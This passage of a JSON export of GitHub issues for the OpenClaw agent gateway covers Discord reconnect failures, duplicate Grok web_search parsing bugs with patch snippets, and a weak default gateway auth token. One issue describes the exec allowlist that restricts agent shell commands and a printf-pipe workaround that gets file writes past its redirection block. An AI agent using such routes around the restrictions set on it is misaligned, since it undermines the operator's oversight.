**Resume session expiration** - Discord invalidates sessions after ~5 minutes of disconnect\n2. **No bounded backoff** - Exponential backoff exceeds session validity window\n3. **No fallback to fresh IDENTIFY** - Resume failures don't trigger new gateway session\n4. **No keepalive tuning** - Cannot configure HEARTBEAT interval or ACK timeout\n\n## Proposed Solutions\n1. **Add gateway reconnect config** (like WhatsApp)\n2. **Cap exponential backoff** at 15-30 seconds\n3. **Fast-fail resume after 3 attempts** → new IDENTIFY\n4. **Add keepalive config** (HEARTBEAT interval, timeout)",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13688",
      "createdAt": "2026-02-10T21:34:49Z",
      "updatedAt": "2026-02-11T00:41:12Z",
      "author": "carmandale",
      "labels": [],
      "taxonomy": {
        "channels": [
          "whatsapp",
          "discord"
        ],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3881510133,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13688#issuecomment-3881510133",
          "createdAt": "2026-02-11T00:41:12Z",
          "updatedAt": "2026-02-11T00:41:12Z",
          "author": "apockill",
          "body": "Bumping this, also having  this issue. Here's some breadcrumb logs:\n\n```\nopenclaw-gateway-1  | 2026-02-10T17:55:33.658Z [agent/embedded] embedded run timeout: runId=5789acbe-e47e-4cf9-8d2f-70c95c41b755 sessionId=32fbf0e3-c366-4be7-8e54-ed2d5a162bc7 timeoutMs=600000\nopenclaw-gateway-1  | 2026-02-10T17:55:33.751Z [agent/embedded] Profile google:default timed out (possible rate limit). Trying next account...\nopenclaw-gateway-1  | 2026-02-10T17:55:34.321Z [discord] Slow listener detected: DiscordMessageListener took 602.2 seconds for event MESSAGE_CREATE\nopenclaw-gateway-1  | 2026-02-10T17:55:50.818Z [discord] gateway: Attempting resume with backoff: 1000ms\nopenclaw-gateway-1  | 2026-02-10T17:55:50.934Z [discord] gateway: WebSocket connection closed with code 1005\nopenclaw-gateway-1  | 2026-02-10T17:56:11.269Z [discord] gateway: Attempting resume with backoff: 1000ms\nopenclaw-gateway-1  | 2026-02-10T17:56:11.370Z [discord] gateway: WebSocket connection closed with code 1005\nopenclaw-gateway-1  | 2026-02-10T17:56:17.756Z [discord] gateway: Attempting resume with backoff: 1000ms\nopenclaw-gateway-1  | 2026-02-10T17:56:17.870Z [discord] gateway: WebSocket connection closed with code 1005\nopenclaw-gateway-1  | 2026-02-10T17:56:56.965Z [discord] gateway: Attempting resume with backoff: 1000ms\nopenclaw-gateway-1  | 2026-02-10T17:56:57.068Z [discord] gateway: WebSocket connection closed with code 1005\nopenclaw-gateway-1  | 2026-02-10T17:57:03.312Z [discord] gateway: Attempting resume with backoff: 1000ms\nopenclaw-gateway-1  | 2026-02-10T17:57:03.381Z [discord] gateway: WebSocket connection closed with code 1005\nopenclaw-gateway-1  | 2026-02-10T17:57:26.411Z [discord] gateway: Attempting resume with backoff: 1000ms\n... skipping a few hundred lines...\nopenclaw-gateway-1  | 2026-02-11T00:36:48.335Z [discord] gateway: Attempting resume with backoff: 1000ms\nopenclaw-gateway-1  | 2026-02-11T00:36:48.473Z [discord] gateway: WebSocket connection closed with code 1005\nopenclaw-gateway-1  | 2026-02-11T00:36:52.442Z [discord] gateway: Attempting resume with backoff: 1000ms\nopenclaw-gateway-1  | 2026-02-11T00:36:52.528Z [discord] gateway: WebSocket connection closed with code 1005\nopenclaw-gateway-1  | 2026-02-11T00:37:33.375Z [discord] gateway: Attempting resume with backoff: 1000ms\nopenclaw-gateway-1  | 2026-02-11T00:37:33.449Z [discord] gateway: WebSocket connection closed with code 1005\nopenclaw-gateway-1  | 2026-02-11T00:38:03.533Z [discord] gateway: Attempting resume with backoff: 1000ms\nopenclaw-gateway-1  | 2026-02-11T00:38:03.608Z [discord] gateway: WebSocket connection closed with code 1005\nopenclaw-gateway-1  | 2026-02-11T00:38:04.580Z [discord] connection stalled: no HELLO received within 30000ms, forcing reconnect\nopenclaw-gateway-1  | 2026-02-11T00:38:04.605Z [discord] gateway error: Error: WebSocket was closed before the connection was established\nopenclaw-gateway-1  | 2026-02-11T00:38:04.611Z [discord] gateway: WebSocket connection closed with code 1006\nopenclaw-gateway-1  | 2026-02-11T00:38:04.619Z [discord] gateway: Attempting resume with backoff: 2000ms after code 1006\nopenclaw-gateway-1  | 2026-02-11T00:38:04.622Z [discord] gateway error: Error: WebSocket was closed before the connection was established\nopenclaw-gateway-1  | 2026-02-11T00:38:04.626Z [discord] gateway: WebSocket connection closed with code 1006\nopenclaw-gateway-1  | 2026-02-11T00:38:27.760Z [discord] gateway: Attempting resume with backoff: 1000ms\nopenclaw-gateway-1  | 2026-02-11T00:38:27.839Z [discord] gateway: WebSocket connection closed with code 1005\nopenclaw-gateway-1  | 2026-02-11T00:38:47.460Z [discord] gateway: Attempting resume with backoff: 1000ms\nopenclaw-gateway-1  | 2026-02-11T00:38:47.556Z [discord] gateway: WebSocket connection closed with code 1005\nopenclaw-gateway-1  | 2026-02-11T00:38:49.655Z [discord] gateway: Attempting resume with backoff: 1000ms\n```"
        }
      ]
    },
    {
      "number": 13023,
      "title": "Grok (xAI) web_search provider broken: live_search API deprecated",
      "body": "## Description\n\nThe Grok (xAI) web search provider added in #12419 (v2026.2.9) returns empty responses (`\"No response\"`) for all queries when used through OpenClaw's `web_search` tool.\n\n## Investigation\n\nOpenClaw correctly uses the Responses API (`POST https://api.x.ai/v1/responses`) with `tools: [{type: \"web_search\"}]` — this is the right endpoint and format.\n\n**However, calling the same endpoint directly with curl works perfectly** and returns full results with citations. So the API itself is functional.\n\nThe issue appears to be in OpenClaw's response parsing. The code expects `data.output_text` but may not be extracting it correctly from the Responses API response structure, which nests content differently:\n\n```json\n{\n  \"output\": [{\n    \"content\": [{\n      \"type\": \"output_text\",\n      \"text\": \"...actual results...\"\n    }]\n  }]\n}\n```\n\nThe code does: `data.output_text ?? \"No response\"` — but the Responses API returns the text nested inside `output[].content[]`, not as a top-level `output_text` field.\n\n## Steps to Reproduce\n\n1. Set `tools.web.search.provider: \"grok\"` in config\n2. Add a valid `XAI_API_KEY`\n3. Run any web search query\n4. Result: `provider: \"grok\", model: \"grok-4-1-fast\", content: \"No response\", citations: []`\n\n## Environment\n\n- OpenClaw: 2026.2.9\n- OS: Ubuntu Linux (arm64)",
      "state": "closed",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13023",
      "createdAt": "2026-02-10T02:12:12Z",
      "updatedAt": "2026-02-11T00:39:25Z",
      "author": "binh",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3874958057,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13023#issuecomment-3874958057",
          "createdAt": "2026-02-10T02:25:36Z",
          "updatedAt": "2026-02-10T02:25:36Z",
          "author": "vacuityv",
          "body": "I think we also need support custom base url for grok search"
        },
        {
          "id": 3881505964,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13023#issuecomment-3881505964",
          "createdAt": "2026-02-11T00:39:24Z",
          "updatedAt": "2026-02-11T00:39:24Z",
          "author": "Takhoffman",
          "body": "Thanks for the report.\n\nThis looks like the same underlying Grok `web_search` parsing issue as #13439 (xAI `/v1/responses` returns content and citations nested under `output[].content[]`, and the top-level `output_text` is null). The canonical tracking issue is #13439.\n\nClosing as a duplicate of #13439. If you are seeing behavior that differs from #13439, please add details there (a redacted sample response payload and your `tools.web.search` config help a lot)."
        }
      ]
    },
    {
      "number": 13320,
      "title": "Grok (xAI) web_search returns empty — output_text is null in Responses API",
      "body": "## Bug\n\nThe new Grok web search provider added in 2026.2.9 (#12419) returns \"No response\" for all queries.\n\n## Root Cause\n\n`runGrokSearch()` reads `data.output_text` from the xAI Responses API response, but xAI does not populate `output_text` at the top level. The actual text is nested at:\n\n```\ndata.output[].content[].text  (where content[].type === \"output_text\")\n```\n\nAnd citations are at:\n```\ndata.output[].content[].annotations[] (where type === \"url_citation\")\n```\n\n## Affected Files\n\nThe same pattern exists in 4 dist files:\n- `pi-embedded-CWm3BvmA.js`\n- `reply-DptDUVRg.js`\n- `extensionAPI.js`\n- `loader-Ds3or8QX.js`\n\n## Suggested Fix\n\nIn `runGrokSearch()`, change:\n```js\ncontent: data.output_text ?? \"No response\",\ncitations: data.citations ?? [],\n```\n\nTo extract from the nested output array when `output_text` is null:\n```js\nconst extractedText = data.output_text\n  ?? (Array.isArray(data.output)\n    ? data.output\n        .flatMap(o => Array.isArray(o.content) ? o.content : [])\n        .filter(c => c.type === \"output_text\" && c.text)\n        .map(c => c.text)\n        .join(\"\\n\")\n    : null)\n  ?? \"No response\";\n\nconst extractedCitations = data.citations\n  ?? (Array.isArray(data.output)\n    ? data.output\n        .flatMap(o => Array.isArray(o.content) ? o.content : [])\n        .flatMap(c => Array.isArray(c.annotations)\n          ? c.annotations.filter(a => a.type === \"url_citation\").map(a => ({ url: a.url, title: a.title }))\n          : [])\n    : []);\n```\n\n## Verification\n\nTested with `curl` against `https://api.x.ai/v1/responses` — the API returns valid results with web search content and citations, but `output_text` is always `null` at the top level.\n\nApplied the above patch locally and Grok search works perfectly with full content + citations.\n\n## Environment\n\n- OpenClaw 2026.2.9\n- xAI API (grok-4-1-fast model)\n- macOS arm64",
      "state": "closed",
      "comments": 3,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13320",
      "createdAt": "2026-02-10T10:20:07Z",
      "updatedAt": "2026-02-11T00:39:23Z",
      "author": "worldcash1",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos",
          "linux"
        ],
        "components": []
      },
      "commentsData": [
        {
          "id": 3877767052,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13320#issuecomment-3877767052",
          "createdAt": "2026-02-10T13:53:12Z",
          "updatedAt": "2026-02-10T13:53:12Z",
          "author": "wolffcatskyy",
          "body": "Fixed in commit 0c7bc30 (2026-02-10). The Grok response parsing now correctly reads from data.output[].content[].text instead of data.output_text."
        },
        {
          "id": 3877770863,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13320#issuecomment-3877770863",
          "createdAt": "2026-02-10T13:53:35Z",
          "updatedAt": "2026-02-10T13:53:35Z",
          "author": "wolffcatskyy",
          "body": "This issue appears to be fixed in commit 0c7bc30 (2026-02-10). The Grok response parsing now correctly reads from data.output[].content[].text instead of data.output_text."
        },
        {
          "id": 3881505889,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13320#issuecomment-3881505889",
          "createdAt": "2026-02-11T00:39:22Z",
          "updatedAt": "2026-02-11T00:39:22Z",
          "author": "Takhoffman",
          "body": "Thanks for the report.\n\nThis looks like the same underlying Grok `web_search` parsing issue as #13439 (xAI `/v1/responses` returns content and citations nested under `output[].content[]`, and the top-level `output_text` is null). The canonical tracking issue is #13439.\n\nClosing as a duplicate of #13439. If you are seeing behavior that differs from #13439, please add details there (a redacted sample response payload and your `tools.web.search` config help a lot)."
        }
      ]
    },
    {
      "number": 13216,
      "title": "Grok web_search provider returns empty results - missing output_text field",
      "body": "## Bug Description\n\nThe `grok` web search provider (added in 2026.2.9) returns `\"No response\"` for all queries.\n\n## Root Cause\n\nIn `extensionAPI.js`, the `runGrokSearch` function reads `data.output_text` from the xAI Responses API:\n\n```js\ncontent: data.output_text ?? \"No response\",\n```\n\nHowever, xAI's `/v1/responses` endpoint does **not** return an `output_text` top-level field (unlike OpenAI's Responses API). The actual response text is nested inside `output[].content[].text` where the output item has `type: \"message\"` and `role: \"assistant\"`.\n\n## xAI Response Structure\n\n```json\n{\n  \"output\": [\n    {\"type\": \"web_search_call\", ...},\n    {\"type\": \"web_search_call\", ...},\n    {\n      \"type\": \"message\",\n      \"role\": \"assistant\",\n      \"content\": [{\"type\": \"output_text\", \"text\": \"The actual response...\"}]\n    }\n  ],\n  \"text\": {\"format\": {\"type\": \"text\"}},\n  \"citations\": []\n}\n```\n\nNote: `output_text` does **not** exist as a top-level key, and `text` is a config object (not the response text).\n\n## Suggested Fix\n\nExtract text from the output array:\n\n```js\nconst messageOutput = data.output?.find(o => o.type === 'message' && o.role === 'assistant');\nconst content = messageOutput?.content?.filter(c => c.type === 'output_text').map(c => c.text).join('') ?? 'No response';\n```\n\nSimilarly, `data.citations` appears to be empty at the top level — citations may need to be extracted from `web_search_call` output items.\n\n## Environment\n\n- OpenClaw: 2026.2.9\n- xAI API key: working (tested with chat completions)\n- xAI model: `grok-4-1-fast` (default)\n- Config: `tools.web.search.provider: \"grok\"` + `tools.web.search.grok.apiKey` set\n\n## Steps to Reproduce\n\n1. Set `tools.web.search.provider` to `\"grok\"`\n2. Set `tools.web.search.grok.apiKey` to a valid xAI API key with credits\n3. Use `web_search` tool with any query\n4. Result: `content: \"No response\"`, `citations: []`",
      "state": "closed",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13216",
      "createdAt": "2026-02-10T06:45:30Z",
      "updatedAt": "2026-02-11T00:39:21Z",
      "author": "luisecab",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3881505822,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13216#issuecomment-3881505822",
          "createdAt": "2026-02-11T00:39:21Z",
          "updatedAt": "2026-02-11T00:39:21Z",
          "author": "Takhoffman",
          "body": "Thanks for the report.\n\nThis looks like the same underlying Grok `web_search` parsing issue as #13439 (xAI `/v1/responses` returns content and citations nested under `output[].content[]`, and the top-level `output_text` is null). The canonical tracking issue is #13439.\n\nClosing as a duplicate of #13439. If you are seeing behavior that differs from #13439, please add details there (a redacted sample response payload and your `tools.web.search` config help a lot)."
        }
      ]
    },
    {
      "number": 13094,
      "title": "Grok web_search provider returns 'No response' — output_text field missing from xAI Responses API",
      "body": "## Bug\n\nThe Grok web_search provider always returns `\"No response\"` because the xAI Responses API (`/v1/responses`) does not include an `output_text` convenience field in its response.\n\n### Location\n`reply-DptDUVRg.js` line ~50846:\n```js\ncontent: data.output_text ?? \"No response\",\n```\n\n### Expected\nThe xAI API returns the text content at:\n```\ndata.output[-1].content[0].text\n```\n(where `output[-1].type === \"message\"` and `content[0].type === \"output_text\"`)\n\n### Actual\n`data.output_text` is `undefined`, so it always falls back to `\"No response\"`.\n\n### Verified via curl\n```json\n// Actual xAI response structure:\n{\n  \"output\": [{\n    \"content\": [{\n      \"type\": \"output_text\",\n      \"text\": \"**4**\"\n    }],\n    \"role\": \"assistant\",\n    \"type\": \"message\"\n  }],\n  \"output_text\": null  // <-- always null\n}\n```\n\n### Fix suggestion\nReplace line ~50846 with something like:\n```js\nconst lastMessage = (data.output ?? []).filter(o => o.type === 'message').pop();\nconst content = lastMessage?.content?.find(c => c.type === 'output_text')?.text \n  ?? data.output_text \n  ?? 'No response';\n```\n\nAlso need to extract citations from `web_search_call` output items.\n\n### Environment\n- OpenClaw v2026.2.9\n- Model: grok-4-1-fast\n- xAI API endpoint: https://api.x.ai/v1/responses",
      "state": "closed",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13094",
      "createdAt": "2026-02-10T03:46:26Z",
      "updatedAt": "2026-02-11T00:39:17Z",
      "author": "cortexpowell-sudo",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3881505647,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13094#issuecomment-3881505647",
          "createdAt": "2026-02-11T00:39:16Z",
          "updatedAt": "2026-02-11T00:39:16Z",
          "author": "Takhoffman",
          "body": "Thanks for the report.\n\nThis looks like the same underlying Grok `web_search` parsing issue as #13439 (xAI `/v1/responses` returns content and citations nested under `output[].content[]`, and the top-level `output_text` is null). The canonical tracking issue is #13439.\n\nClosing as a duplicate of #13439. If you are seeing behavior that differs from #13439, please add details there (a redacted sample response payload and your `tools.web.search` config help a lot)."
        }
      ]
    },
    {
      "number": 12860,
      "title": "[Bug]: Grok (xAI) web_search provider returns \"No response\" — parser reads wrong response field",
      "body": "## Bug: Grok (xAI) web_search provider returns \"No response\" — parser reads wrong field\n\n### Summary\nThe Grok web_search provider (#12419) always returns `\"No response\"` because `runGrokSearch()` reads `data.output_text` from the xAI Responses API, but xAI returns `null` for that field. The actual content is in `data.output[last].content[0].text` (where content item has `type: \"output_text\"`).\n\n### Steps to reproduce\n1. Set `tools.web.search.provider: \"grok\"` and configure `XAI_API_KEY`\n2. Set `tools.web.search.grok.model: \"grok-4-1-fast-non-reasoning\"` (note: the default `grok-4-1-fast` doesn't exist in xAI's model list)\n3. Run any web_search query\n4. Result: `content: \"No response\"` despite the API returning a full synthesized answer\n\n### Root cause\nIn `runGrokSearch()`:\n```js\ncontent: data.output_text ?? \"No response\"\n```\n\nThe xAI `/v1/responses` API returns:\n- `output_text: null`\n- Actual content at: `data.output[N].content[M].text` where `output[N].type === \"message\"` and `content[M].type === \"output_text\"`\n\nSimilarly, citations are in `data.output[N].content[M].annotations` (type `url_citation`), not `data.citations`.\n\n### Additional issue\nThe `DEFAULT_GROK_MODEL` constant is `\"grok-4-1-fast\"` which doesn't exist. Available models are `grok-4-1-fast-non-reasoning` and `grok-4-1-fast-reasoning`.\n\n### Fix\nReplace the response parsing in `runGrokSearch()` to walk `data.output` array for the message content and annotations. Both `reply-*.js` and `pi-embedded-*.js` need the fix.\n\n### Environment\n- OpenClaw v2026.2.9\n- xAI API (`/v1/responses` endpoint)\n- Model: `grok-4-1-fast-non-reasoning`\n",
      "state": "closed",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/12860",
      "createdAt": "2026-02-09T20:22:51Z",
      "updatedAt": "2026-02-11T00:39:15Z",
      "author": "FarzadClaw",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3875488372,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12860#issuecomment-3875488372",
          "createdAt": "2026-02-10T05:53:58Z",
          "updatedAt": "2026-02-10T05:53:58Z",
          "author": "ember-claw",
          "body": "## Confirmed + Workaround Patch for 2026.2.9\n\nI hit this exact bug and dug into the source. Here's what's happening and a working patch.\n\n### Root Cause\n\n`runGrokSearch()` in `dist/reply-DptDUVRg.js` (and `dist/pi-embedded-*.js`) reads:\n\n```js\ncontent: data.output_text ?? \"No response\",\ncitations: data.citations ?? [],\n```\n\nBut xAI's Responses API (`https://api.x.ai/v1/responses`) returns content in:\n```\ndata.output[0].content[0].text  // (where output[0].type === 'message')\n```\n\n`data.output_text` is always `undefined`, so you get `\"No response\"` every time.\n\nAdditionally, the Zod config schema only allows `\"brave\" | \"perplexity\"` — setting `provider: \"grok\"` passes `resolveSearchProvider()` but gets silently stripped by config validation.\n\n### Working Patch\n\n**Parser fix** (both `reply-*.js` and `pi-embedded-*.js`):\n\n```js\n// Replace the content line:\ncontent: (data.output_text ?? (Array.isArray(data.output) ? data.output.filter(o => o.type === \"message\").flatMap(o => Array.isArray(o.content) ? o.content.filter(c => c.type === \"output_text\" || c.type === \"text\").map(c => c.text) : []).join(\"\") : \"\")) || \"No response\",\n\n// Replace the citations line:\ncitations: data.citations ?? (Array.isArray(data.output) ? data.output.filter(o => o.type === \"message\").flatMap(o => Array.isArray(o.content) ? o.content.flatMap(c => Array.isArray(c.annotations) ? c.annotations.filter(a => a.type === \"url_citation\").map(a => ({url: a.url, title: a.title || \"\"})) : []) : []) : []),\n```\n\n**⚠️ IMPORTANT**: The outer parens around the `??` expression are required. You cannot mix `??` and `||` without explicit parentheses — it's a JS spec requirement and will throw a SyntaxError that prevents the gateway from starting.\n\n**Schema fix** (4 `config-*.js` files containing `z.literal(\"brave\")`):\n\nAdd `z.literal(\"grok\")` to the provider union.\n\n**Verify before restarting**:\n```bash\nnode -e \"require('./dist/pi-embedded-CWm3BvmA.js')\"\nnode -e \"require('./dist/reply-DptDUVRg.js')\"\n```\n\n### Direct API Confirmation\n\nThe xAI API itself works fine:\n```bash\ncurl https://api.x.ai/v1/responses -H \"Authorization: Bearer $XAI_API_KEY\" \\\n  -d '{\"model\":\"grok-4-1-fast\",\"tools\":[{\"type\":\"web_search\"}],\"input\":\"weather albany ny\"}'\n```\n\nReturns full results with citations in `output[].content[].text` + `output[].content[].annotations[]`.\n\nTested on OpenClaw 2026.2.9. Hope this helps others until the official fix ships. 🔥"
        },
        {
          "id": 3881505578,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12860#issuecomment-3881505578",
          "createdAt": "2026-02-11T00:39:15Z",
          "updatedAt": "2026-02-11T00:39:15Z",
          "author": "Takhoffman",
          "body": "Thanks for the report.\n\nThis looks like the same underlying Grok `web_search` parsing issue as #13439 (xAI `/v1/responses` returns content and citations nested under `output[].content[]`, and the top-level `output_text` is null). The canonical tracking issue is #13439.\n\nClosing as a duplicate of #13439. If you are seeing behavior that differs from #13439, please add details there (a redacted sample response payload and your `tools.web.search` config help a lot)."
        }
      ]
    },
    {
      "number": 13756,
      "title": "[Bug]: `openclaw configure` writes literal string \"undefined\" as gateway.auth.token",
      "body": "## Bug Description\n\nWhen running `openclaw configure` (v2026.2.6-3) on Windows, the gateway auth token in `openclaw.json` is set to the literal string `\"undefined\"` instead of a proper random token. This causes `gateway.cmd` to contain `OPENCLAW_GATEWAY_TOKEN=undefined`, which can lead to authentication anomalies and potential gateway hangs under load.\n\n## Steps to Reproduce\n\n1. Run `openclaw configure` on Windows (local mode, token auth)\n2. Check `~/.openclaw/openclaw.json`\n3. Observe `gateway.auth.token` is the string `\"undefined\"`\n4. Check `~/.openclaw/gateway.cmd` — confirms `OPENCLAW_GATEWAY_TOKEN=undefined`\n\n## Root Cause\n\nIn the configure wizard, `buildGatewayAuthConfig` directly assigns `params.token` without a null/undefined guard:\n\n```js\n// buildGatewayAuthConfig\nif (params.mode === \"token\") return {\n    ...base,\n    mode: \"token\",\n    token: params.token  // if params.token is JS undefined, JSON.stringify writes \"undefined\"\n};\n```\n\nWhen `params.token` (or `params.gatewayToken`) is JS `undefined`, it gets written into the config object. `JSON.stringify` then serializes it as the string `\"undefined\"`.\n\nThe fallback chain in `daemon-cli`:\n```js\ntoken: opts.token || cfg.gateway?.auth?.token || process.env.OPENCLAW_GATEWAY_TOKEN\n```\n...picks up `\"undefined\"` (truthy string) from `cfg.gateway.auth.token`, so the fallback to env var or random generation never triggers.\n\n## Expected Behavior\n\n`buildGatewayAuthConfig` should guard against undefined/null/empty token values:\n\n```js\nif (params.mode === \"token\") return {\n    ...base,\n    mode: \"token\",\n    token: params.token || randomToken()  // fallback to random if undefined/empty\n};\n```\n\nOr `normalizeGatewayTokenInput` should reject the string `\"undefined\"`:\n\n```js\nfunction normalizeGatewayTokenInput(value) {\n    if (typeof value !== \"string\") return \"\";\n    const trimmed = value.trim();\n    return trimmed === \"undefined\" ? \"\" : trimmed;\n}\n```\n\n## Impact\n\n- Gateway runs with a known/guessable \"token\" (the literal word \"undefined\")\n- Security: anyone who guesses the token can access the gateway\n- May cause internal auth logic issues under high load (multiple concurrent subagent sessions)\n- Observed: gateway became unresponsive after heavy parallel workload, possibly related\n\n## Environment\n\n- OpenClaw: v2026.2.6-3\n- OS: Windows 10 (19045)\n- Node: v24.13.0\n- Mode: local, token auth\n- Channel: Telegram\n\n## Workaround\n\nManually patch the config via gateway API or edit `~/.openclaw/openclaw.json` directly, replacing `\"undefined\"` with a proper random hex string, then restart the gateway.\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13756",
      "createdAt": "2026-02-11T00:32:48Z",
      "updatedAt": "2026-02-11T00:32:48Z",
      "author": "calvinguo721",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "windows"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 12910,
      "title": "Grok (xAI) web_search provider returns 400: Argument not supported: include",
      "body": "## Description\nThe new Grok web_search provider (added in 2026.2.9) fails with an xAI API error.\n\n## Error\n```\nxAI API error (400): {\"code\":\"400\",\"error\":\"Argument not supported: include\"}\n```\n\n## Steps to Reproduce\n1. Configure Grok as web_search provider:\n```json\n{\n  \"tools\": {\n    \"web\": {\n      \"search\": {\n        \"provider\": \"grok\",\n        \"grok\": {\n          \"apiKey\": \"xai-...\",\n          \"model\": \"grok-4\"\n        }\n      }\n    }\n  }\n}\n```\n2. Run any web_search query\n3. Get 400 error about unsupported `include` argument\n\n## Expected Behavior\nGrok search should work like Brave/Perplexity providers.\n\n## Environment\n- OpenClaw version: 2026.2.9\n- xAI account with credits loaded\n- Direct curl to `https://api.x.ai/v1/chat/completions` with grok-4 works fine\n\n## Notes\n- The xAI API key works correctly when tested directly via curl\n- The `include` parameter being sent is likely for search grounding but isn't accepted by xAI's API\n- Tried with both default model (grok-4-1-fast) and grok-4, same error\n- Also tried with `inlineCitations: true`, same error",
      "state": "closed",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/12910",
      "createdAt": "2026-02-09T22:23:09Z",
      "updatedAt": "2026-02-11T00:27:36Z",
      "author": "brandonmcninja",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 13749,
      "title": "exec allowlist: heredocs (<<) incorrectly blocked as redirections when target binary is in safeBins",
      "body": "## Problem\n\nWhen `exec.security = \"allowlist\"` with `safeBins` configured, **heredoc syntax** (`<<`, `<< 'EOF'`) is rejected by the shell-safety parser using the same rule that blocks output redirections (`>`, `>>`, `2>/dev/null`).\n\nThis incorrectly prevents agents from using standard shell idioms to pass multi-line input to allowlisted binaries.\n\n## Reproduction\n\n```jsonc\n// openclaw.json\n{\n  \"agents\": {\n    \"team\": {\n      \"tools\": {\n        \"exec\": {\n          \"security\": \"allowlist\",\n          \"safeBins\": [\"/usr/bin/git\", \"/usr/bin/tee\"]\n        }\n      }\n    }\n  }\n}\n```\n\n**Blocked (should work):**\n```bash\n/usr/bin/tee /path/to/file << 'EOF'\nfile contents here\nEOF\n```\n\n```bash\n/usr/bin/git -C /repo apply --verbose - << 'PATCH'\ndiff --git a/file.ts b/file.ts\n...\nPATCH\n```\n\n**Works (same effect, worse ergonomics):**\n```bash\n/usr/bin/printf 'file contents here' | /usr/bin/tee /path/to/file\n```\n\nBoth pass the same data to the same allowlisted binary — only the syntax differs.\n\n## Expected Behavior\n\nHeredocs should be permitted when the target binary is in `safeBins`. The allowlist parser should distinguish between:\n\n| Syntax | Type | Should Block? |\n|--------|------|---------------|\n| `>`, `>>` | Output redirection (shell writes to file) | **Yes** — bypasses binary, shell writes directly |\n| `2>/dev/null` | Stderr redirection | **Yes** — same reason |\n| `<<`, `<< 'EOF'` | Heredoc (stdin input to binary) | **No** — equivalent to piping, binary controls behavior |\n| `<` | Input redirection (file to stdin) | **Debatable** — but also equivalent to `cat file \\| cmd` |\n\n## Actual Behavior\n\nAll redirection-like tokens (`>`, `>>`, `<<`, `<`) appear to be matched by a single regex or token check, triggering approval prompt or silent deny regardless of direction.\n\n## Security Analysis\n\n**Heredocs do not reduce security:**\n\n1. **Stdin, not file writes.** Heredocs pass text to a process's stdin — they don't write to the filesystem. The shell operator `>` is dangerous because the *shell* writes to an arbitrary path; heredocs don't do this.\n\n2. **Already equivalent to piping.** If `printf '...' | /usr/bin/tee file` is allowed (and it is), then `/usr/bin/tee file << 'EOF'` should be too — same binary, same input, same result.\n\n3. **Variable expansion is a non-issue.** Unquoted heredocs (`<< EOF`) allow `$VAR` expansion, but `$()` command substitution is already blocked by a separate check. Quoted heredocs (`<< 'EOF'`) have no expansion at all.\n\n4. **The security boundary is the binary.** If the binary is trusted enough for `safeBins`, it's trusted to receive stdin regardless of the delivery mechanism.\n\n## Impact\n\nThis forces agents using allowlist mode to write files via `printf | tee`, which:\n- Breaks on content containing single quotes, backslashes, or special characters\n- Makes multi-line file writes (code, patches, configs) extremely fragile\n- Prevents standard `git apply` patch workflows\n- Creates a false sense of security (the workaround achieves the same result)\n\n## Suggested Fix\n\nIn the shell command parser (likely in `pi-tools.ts` or the exec security module), split the redirection token check:\n\n```typescript\n// Current (blocks all redirections including heredocs):\nconst hasRedirection = /[<>]/.test(command)\n\n// Proposed (block output redirections, allow heredocs):\nconst hasOutputRedirection = /(?:>>?|2>)/.test(command)\nconst hasHeredoc = /<</.test(command)\n// Only block on hasOutputRedirection, not hasHeredoc\n```\n\nOr more precisely, check for `<<` first and exclude it before checking for `<` / `>`.\n\n## Workaround\n\nUse piping instead of heredocs:\n```bash\n/usr/bin/printf 'content' | /usr/bin/tee /path/to/file\n```\n\n## Environment\n\n- **OpenClaw:** 2026.2.9\n- **OS:** macOS 15.4 (Darwin 24.5.0, arm64)\n- **Config:** `exec.security: \"allowlist\"` with `safeBins`\n- **Related:** PR #11854 (per-agent exec config)\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13749",
      "createdAt": "2026-02-11T00:16:10Z",
      "updatedAt": "2026-02-11T00:17:38Z",
      "author": "brin-tapcart",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 1839,
      "title": "[Bug] Matrix plugin wizard installation fails with EUNSUPPORTEDPROTOCOL causing duplicate plugin warnings",
